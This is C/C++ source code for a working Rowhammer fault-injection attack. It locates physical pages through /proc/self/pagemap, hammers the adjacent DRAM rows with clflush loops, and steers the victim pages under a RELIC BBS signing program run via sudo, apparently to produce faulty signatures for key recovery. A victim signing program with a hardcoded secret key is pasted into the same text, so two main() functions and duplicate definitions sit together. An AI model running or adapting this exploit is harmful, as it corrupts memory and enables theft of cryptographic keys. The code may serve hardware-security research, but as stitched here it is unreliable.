#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <sys/sysinfo.h>
#include <utility> 
#include <sys/personality.h>


#include <sched.h>
#include <inttypes.h>
#include <time.h>



#define PAGE_SIZE 4096
#define TOGGLES 3000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define MAX_POSITION 9
#define JUNK1 10
using namespace std;

int STACK_SIZE = 0;
int NUMBER_PAGES=0,NUMBER_TARGET=5;
int TARGET_PAGE[10];
size_t mem_size;
char *memory;
double fraction_of_physical_memory = 0.3;

bool hammer = true;
uintptr_t attackPages[10086], abovePages[10086], belowPages[10086],offset[10086];

enum Pattern { zero_zero_zero, zero_zero_one, one_zero_zero, one_zero_one };

struct PageCandidate {
    uint64_t pageNumber;
    uint64_t abovePage;
    uint64_t belowPage;

    uint8_t* pageVA;
    uint8_t* aboveVA[2];
    uint8_t* belowVA[2];
    uint8_t offset;
};


uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}




bool pagesFilled(PageCandidate p) {
    if(p.pageVA != 0 && p.aboveVA[0] != 0 && p.belowVA[0] != 0) {
        return true;
    } else {
        return false;
    }
}


void *GetBlockByOrder(int order){
    size_t s=PAGE_SIZE*pow(2, order);
    mem_size = s;
    void *ptr = memory;

    for (uint64_t index = 0; index < s; index += 0x1000) {
        uint64_t* temporary = reinterpret_cast<uint64_t*>(static_cast<uint8_t*>(ptr) + index);
        temporary[0] = index+1;
    }
    return ptr;
}


uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));

    printf("MemorySize: %ld\n", mem_size);  


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(memory != MAP_FAILED);

    for(size_t i = 0; i < mem_size; i++) {
	    memory[i] = 77 + i;
	    //printf("%lx\n",getPage((uint8_t*)&memory[i]));
    }
}

void fillMemory(uint8_t* victimVA, uint8_t* aboveVA, uint8_t* belowVA) {
    memset((void *) victimVA, 0x00, PAGE_SIZE);

    uint8_t lowerBits = 0x00;
    uint8_t upperBits = 0x01;
    for(int i = 0; i < PAGE_SIZE; i++) {
        if(i % 2 == 0) {
            memset((void *) (aboveVA + i), lowerBits, 1);
            memset((void *) (belowVA + i), lowerBits, 1);
        } else {
            memset((void *) (aboveVA + i), upperBits, 1);
            memset((void *) (belowVA + i), upperBits, 1);
        }
    }
}




void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations, int togs) {
    for(int i = 0; i < iterations; i++) {
        volatile uint64_t *f = (volatile uint64_t *)aboveVA;
        volatile uint64_t *s = (volatile uint64_t *)belowVA;
        unsigned long iters = togs;

        for(; iters --> 0;) {
            asm volatile("clflush (%0)" : : "r" (f) : "memory");
            *f;
            asm volatile("clflush (%0)" : : "r" (s) : "memory");
            *s;
        }
    }
}





void addVAstoPages(vector<PageCandidate> &pages) {
    printf("Searching for page VAs...\n");
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }

            if(p.abovePage == moverPA) {
                p.aboveVA[0] = moverVA;
	        	match = true;
            }
            if(p.belowPage == moverPA) {
                p.belowVA[0] = moverVA;
	        	match = true;
            }

            if(p.abovePage + 1 == moverPA) {
                p.aboveVA[1] = moverVA;
	        	match = true;
            }
            if(p.belowPage + 1 == moverPA) {
                p.belowVA[1] = moverVA;
	        	match = true;
            }

            pages[i] = p;
        }



            moverVA += 0x1000;
    }
    printf("Done searching...\n\n");
}



void rowhammerAttack(vector<PageCandidate> &pages) {
    int j=0;
    for(int i = 0; i < NUMBER_PAGES; i++) {
    if(pages[i].aboveVA[0]!=NULL && pages[i].belowVA[0]!=NULL && pages[i].pageVA !=NULL)
    {
    	TARGET_PAGE[j]=i;
    	printf("Target: %d\n", TARGET_PAGE[j]);
        printf("Target PFN: %p\n", pages[TARGET_PAGE[j]].pageNumber);
    //  printf("Above VA1: %p\n", pages[TARGET_PAGE[j]].aboveVA[0]);
     // printf("Target VA: %p\n", pages[TARGET_PAGE[j]].pageVA);
      //printf("Below VA1: %p\n", pages[TARGET_PAGE[j]].belowVA[0]);
   	printf("bit flip:%ld\n", offset[TARGET_PAGE[j]]);
        printf("\n");
    	j++;
    	if(j==NUMBER_TARGET){
    	break;
    	}
    }

    }
       


    for(int i = 0; i < NUMBER_TARGET; i++) {
        PageCandidate p = pages[TARGET_PAGE[i]];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
        }
    }
    

    printf("All pages found...\n");

  //  printf("Pages size: %d\n", pages.size());

  //  printf("Holding same DRAM pages\n");
    
	
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    PageCandidate p = pages[TARGET_PAGE[i]];
	    fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
	  //  fillMemory(p.pageVA, p.aboveVA[1], p.belowVA[1]);
	   // printf("pageNUmber:%d\n",p.pageNumber);
           // formOuterPages(p);
    }


	 //    p = pages[TARGET_PAGE];
	  //  fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
	

    uint8_t *mapping = (uint8_t *)(GetBlockByOrder(12));

    vector<pair<int, uint64_t>> indices;
    int count = 0;
    while(indices.size() < JUNK1+ STACK_SIZE) {
    	//printf("count: %d, indices.size=%d\n", count,indices.size());
        pair<int, uint64_t> p;
        uint64_t addrs = getPage((uint8_t*)mapping+PAGE_SIZE*count);
        //printf("addrs: %lx\n",addrs);
        if(addrs >= 0x100000) { 
            p = make_pair(count, addrs);
            indices.push_back(p);
        }
        count++;

    }
  
FILE* fp4=fopen("page.txt","w");

    for(int i = 0; i < JUNK1; i++) {
	    fprintf(fp4,"Bottom Iteration %i: %lx\n", i, indices[i].second);
    }
    
    
    
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    fprintf(fp4,"Victim Iteration %i: %x\n", i, pages[TARGET_PAGE[i]].pageNumber);
    }
    
    // fprintf(fp4,"Victim Iteration: %x\n", pages[TARGET_PAGE].pageNumber);
    
    
    
    for(int i = JUNK1; i < JUNK1+STACK_SIZE; ++i) {
	    fprintf(fp4,"Top Iteration %i: %lx\n", i, indices[i].second);
    }
	fflush(fp4);


    printf("Starting hammering...\n");

    fflush(stdout);
  //  sleep(1);


   

    int pid = fork();
    if(pid == 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(1, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");

        for(int i = 0; i < JUNK1; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
            
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    memset((void *) pages[TARGET_PAGE[i]].pageVA, TARGET_PAGE[i]&0xFF, PAGE_SIZE);
    }
    
            
        
        for(int i = JUNK1; i < STACK_SIZE+JUNK1; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
        hammer=1;
        printf("begin hammer!\n");

        while(hammer) {
                int togs = TOGGLES;
                for(int pNum = 0; pNum < NUMBER_TARGET; pNum++) {
                    rowhammer(pages[TARGET_PAGE[pNum]].aboveVA[0], pages[TARGET_PAGE[pNum]].belowVA[0], 1000000, togs);
                }
        }
        
    } else {

        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(4, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");

	
	//sleep(2);
        for(int i = 0; i < JUNK1; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }
        
        
        /*
        for(int i = 0; i < NUMBER_PAGES; i++) {
            munmap((void *) pages[i].pageVA, PAGE_SIZE);
        }*/
            for(int i = 0; i < NUMBER_TARGET; i++) {
	    munmap((void *) pages[TARGET_PAGE[i]].pageVA, PAGE_SIZE);
    }
        
         
        
        for(int i = JUNK1; i < STACK_SIZE+JUNK1; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }
        

        printf("finish munmaping\n");
        
	int ok = system("sudo taskset -c 4 ./relic-main/main");
        //int ok = system("sudo taskset 0x2 ./check");
        
        printf("System call status: %i\n", ok);

        sleep(6);


        system("sudo pkill attack");
    }



	printf("Done hammering\n");
	return;
}


#include <relic/relic.h>
#include <relic/relic_test.h>
#include <relic/relic_bench.h>
#include<assert.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <vector>

#include <sched.h>
#include <inttypes.h>
#include <time.h>


#define NUMBER_PAGES 2
#define PAGE_SIZE 4096
#define TOGGLES 3000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define MAX_POSITION 9





uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}


int N=1;
/*
* num of wrong signtures
* this algorithm will save sk to sk.txt, pp to pp.txt and signatures to sign.txt,
* creat a total of N signtures
*/
void init(bn_t d){
    char sk2[]="7B2C1FBDBF650F0E76136967AB67E0A514F1AC99D8357DA0A02F4192";
    bn_read_str(d,sk2,strlen(sk2),16);
    //签名没必要用公共参数,我单独保存下来就行
    //g2_mul_gen(q, d);
    //gt_get_gen(z);
}
void save_sign(g1_t s){//格式： 长度+签名的二进制内容
    FILE* fp3=fopen("sign.txt","a+");
    fprintf(fp3,"\n");
    
    uint8_t sign_buf[1024];
    size_t s_len=g1_size_bin(s,0);
    fwrite(&s_len,sizeof(s_len),1,fp3);
    memset(sign_buf,0,1024);
    g1_write_bin(sign_buf,1024,s,0);
    //fwrite(sign_buf,1,s_len,fp3);
    for(int i=0;i<s_len;i++){
    fprintf(fp3,"%02x",sign_buf[i]);
    
    }
    fprintf(fp3,"\n");
    fclose(fp3);
    /*
    FILE* fp4=fopen("truth.txt","r");
    char truth[1024]; 
    while(fgets(truth,sizeof(truth),fp4)!=NULL)
    {
    
    }
    char temp;
    for(int i=0;i<s_len;i++){
    
    sprintf(&temp, "%x", sign_buf[i]/16);
    if(temp!= truth[i*2+1]){
    printf("error! i=%d,%c,%c\n",i*2+1,temp,truth[i*2+1]);
    }
    sprintf(&temp, "%x", sign_buf[i]%16);
    if(temp!=truth[i*2+2]){
    printf("error! i=%d,%c,%c\n",i*2+2,temp,truth[i*2+2]);
    }

    }
    */

}
int main(){

    static bn_t d;
    
    if (core_init() != RLC_OK) {
		core_clean();
		return 1;
	}
    
    if (pc_param_set_any() == RLC_OK){
        int code = RLC_ERR;
        bn_null(d);
        bn_new(d);
        init(d);
	    g1_t s;
        gt_t z1;
        uint8_t m[5] = { 0, 1, 2, 3, 4 }, h[RLC_MD_LEN];
	    g1_null(s);
		g1_new(s);
        gt_new(z1);
        printf("PFN:%lx, logic address:%lx\n",getPage((uint8_t *)&d), &d);
       sleep(1); 
            //signature here,
        if(cp_bbs_sig(s, m, sizeof(m), 0, d) != RLC_OK){
            util_printf("sign wrong\n");
            assert(0);
        }
        
        
        save_sign(s);
        
        util_printf("finish\n");
    }
}





int main(int argc, char *argv[]) {
    printf("Starting program...\n");
    int opt;
    while ((opt = getopt(argc, argv, "to:")) != -1) {
        switch(opt) {
            case 'o':
                STACK_SIZE = (int) strtol(optarg, NULL, 10);
		        break;
            case 't':
                hammer = false;
                printf("Starting test mode...\n\n");
                break;
        }
    }

    printf("Stack size is %i\n", STACK_SIZE);
    FILE *fp=fopen("bitflip_addrs_full","r");
    if(fp==NULL){
    printf("can not load file!\n");
    }
    char line[1000];
    while(fgets(line,sizeof(line),fp)!=NULL)
    {
    	line[strcspn(line,"\n")]='\0';
    	char* token;
    	token=strtok(line, ",");
    	if(token!=NULL){
    	abovePages[NUMBER_PAGES]=stol(token,0,16);
    	abovePages[NUMBER_PAGES]=abovePages[NUMBER_PAGES]/0x1000;
    	token=strtok(NULL,",");
    	}
    	if(token!=NULL){
    	belowPages[NUMBER_PAGES]=stol(token,0,16);
    	belowPages[NUMBER_PAGES]=belowPages[NUMBER_PAGES]/0x1000;
    	token=strtok(NULL,",");
    	}
    	if(token!=NULL){
    	attackPages[NUMBER_PAGES]=stol(token,0,16);
    	//printf("%lx\n",attackPages[NUMBER_PAGES]);
    	//printf("%x\n",belowPages[NUMBER_PAGES]);
    	attackPages[NUMBER_PAGES]=attackPages[NUMBER_PAGES]/0x1000;
    	offset[NUMBER_PAGES]=8*attackPages[NUMBER_PAGES]%0x1000;
    	token=strtok(NULL,",");
    	}
    	
    	if(token!=NULL){
    	offset[NUMBER_PAGES]+=atoi(token);
    	token=strtok(NULL,",");
    	}
    	
    	if(offset[NUMBER_PAGES]>512 && offset[NUMBER_PAGES] <512+1024){
    	NUMBER_PAGES++;
    	}
    }
    printf("get %d pages!\n",NUMBER_PAGES);

    string fileText;
    string subString;
    string dataString;
    string needle;
    int pageCount = 0;
    uintptr_t pageValue;


    //uintptr_t attackPages[NUMBER_PAGES] = { 0x191b2c, 0x191b2b};
    //uintptr_t abovePages[NUMBER_PAGES] = { 0x191b0a, 0x191b0e};
    //uintptr_t belowPages[NUMBER_PAGES] = { 0x191b43, 0x191b47};

    setupMapping();
    printf("Finished setting up memory...\n");

    vector<PageCandidate> pages;
    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p;
        p.pageNumber = attackPages[i];
        p.abovePage = abovePages[i];
        p.belowPage = belowPages[i];

        p.pageVA = 0;
        p.aboveVA[0] = 0;
        p.aboveVA[1] = 0;
        p.belowVA[0] = 0;
        p.belowVA[1] = 0;
        pages.push_back(p);
    }

    addVAstoPages(pages);

    rowhammerAttack(pages);

    return 0;
}
